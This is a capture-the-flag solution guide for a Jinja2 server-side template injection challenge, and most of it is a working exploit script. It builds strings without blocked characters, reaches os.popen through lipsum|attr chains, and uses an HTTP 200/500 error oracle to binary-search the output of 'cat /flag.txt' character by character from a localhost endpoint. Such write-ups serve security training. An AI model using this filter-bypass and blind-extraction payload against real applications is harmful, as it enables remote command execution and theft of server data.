# A05 Hard: Solution Guide

### Vulnerability Analysis
1. String generation without blocked characters:
   `def brk(s): return "'%s'|format(%s)" % ('%c'*len(s), ",".join(map(str, map(ord, s))))`
2. Attribute access without dot or square bracket:
   `lipsum|attr(...)` to access `__globals__`, `os`, `popen`, and `read`.
3. Boolean oracle side-channel:
   `{% if <condition> %}{{ 7*7 }}{% else %}{{ 1/0 }}{% endif %}`
   If the condition is True, the server returns `HTTP 200`. If False, division by zero triggers `HTTP 500`.

### Exploit Script
```python
import requests
import sys

TARGET = "http://127.0.0.1:6015/api/telemetry/probe"

def brk(s):
    return "'%s'|format(%s)" % ('%c'*len(s), ",".join(map(str, map(ord, s))))

GL = brk("__globals__"); OS = brk("os"); POP = brk("popen"); RD = brk("read")
GETI = brk("__getitem__")

def chain(cmd):
    return "lipsum|attr(%s)|attr('get')(%s)|attr(%s)(%s)|attr(%s)()" % (GL, OS, POP, brk(cmd), RD)

S = chain("cat /flag.txt")

def check(cond, timeout=10):
    p = "{% if " + cond + " %}{{7*7}}{% else %}{{1/0}}{% endif %}"
    r = requests.post(TARGET, json={"format": p}, timeout=timeout)
    return r.status_code == 200

def get_length():
    lo, hi = 1, 100
    while lo < hi:
        mid = (lo + hi) // 2
        if check("(" + S + "|length) > " + str(mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo

def char_at(i):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if check("(" + S + "|attr(" + GETI + ")(" + str(i) + ")) < " + brk(chr(mid))):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo - 1)

if __name__ == "__main__":
    length = get_length()
    print("Flag length:", length)
    flag = ""
    for i in range(length):
        c = char_at(i)
        flag += c
        sys.stdout.write(c)
        sys.stdout.flush()
    print("\nRecovered Flag:", flag)
```
